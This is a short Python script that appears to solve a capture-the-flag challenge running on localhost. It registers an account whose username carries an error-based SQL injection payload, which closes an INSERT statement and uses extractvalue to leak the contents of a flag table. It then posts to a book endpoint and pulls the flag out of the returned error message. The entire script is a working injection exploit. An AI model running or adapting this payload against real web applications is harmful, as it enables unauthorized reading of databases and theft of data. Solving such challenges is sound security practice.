import requests
import re
import json

s = requests.Session()

url = "http://localhost:5003"

payload = "'), (1,2,(select extractvalue(1,concat(0x5c,(select flag from flag))))) -- a"
cred = {"username": payload, "password":"123"}
r = s.post(url + '/register', data=cred)
r = s.post(url + '/login', data=cred)

book = {"book_name": 1, "content": 2}
r = s.post(url + '/my-book', data=book)

data = json.loads(r.text)
FLAG = re.findall(r"SSS\{.+?\}", data['error'])
print(f"FLAG: {FLAG[0]}")
